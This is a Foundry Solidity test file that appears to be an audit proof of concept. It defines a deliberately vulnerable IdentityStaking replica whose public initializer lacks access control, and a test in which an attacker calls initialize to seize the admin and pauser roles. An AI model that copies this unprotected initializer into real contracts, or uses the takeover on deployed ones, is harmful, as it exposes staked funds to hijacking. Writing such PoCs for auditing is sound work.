pragma solidity 0.8.20;

import "forge-std/Test.sol";

// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract IdentityStaking {
    // simplified role storage
    mapping(bytes32 => mapping(address => bool)) private _roles;

    bytes32 public constant DEFAULT_ADMIN_ROLE = keccak256("DEFAULT_ADMIN_ROLE");
    bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");
    bytes32 public constant SLASHER_ROLE = keccak256("SLASHER_ROLE");
    bytes32 public constant RELEASER_ROLE = keccak256("RELEASER_ROLE");

    // token + burn address set in initializer
    address public token;
    address public burnAddress;

    // simple initializer guard (vulnerability: public initializer allows first caller to become admin)
    bool private _initialized;
    modifier initializer() {
        require(!_initialized, "already initialized");
        _;
        _initialized = true;
    }

    function _grantRole(bytes32 role, address account) internal {
        _roles[role][account] = true;
    }

    function hasRole(bytes32 role, address account) external view returns (bool) {
        return _roles[role][account];
    }

    // Vulnerable public initializer
    function initialize(
        address tokenAddress,
        address _burnAddress,
        address initialAdmin,
        address[] calldata initialSlashers,
        address[] calldata initialReleasers
    ) public initializer {
        if (tokenAddress == address(0)) revert("AddressCannotBeZero");

        _grantRole(DEFAULT_ADMIN_ROLE, initialAdmin);
        _grantRole(PAUSER_ROLE, initialAdmin);

        for (uint256 i = 0; i < initialSlashers.length; i++) {
            _grantRole(SLASHER_ROLE, initialSlashers[i]);
        }

        for (uint256 i = 0; i < initialReleasers.length; i++) {
            _grantRole(RELEASER_ROLE, initialReleasers[i]);
        }

        token = tokenAddress;
        burnAddress = _burnAddress;
    }
}

contract IdentityStakingTest is Test {
    IdentityStaking target;
    address attacker;
    address tokenAddr;
    address burnAddr;

    function setUp() public {
        target = new IdentityStaking();
        attacker = makeAddr("attacker");
        tokenAddr = makeAddr("token");
        burnAddr = makeAddr("burn");
    }

    function test_attacker_exploits_initialize() public {
        vm.prank(attacker);
        address[] memory empty = new address[](0);
        target.initialize(tokenAddr, burnAddr, attacker, empty, empty);

        // attacker now has admin & pauser roles and token/burnAddress were set to attacker's choices
        assertTrue(target.hasRole(target.DEFAULT_ADMIN_ROLE(), attacker));
        assertTrue(target.hasRole(target.PAUSER_ROLE(), attacker));
        assertEq(target.token(), tokenAddr);
        assertEq(target.burnAddress(), burnAddr);
    }
}

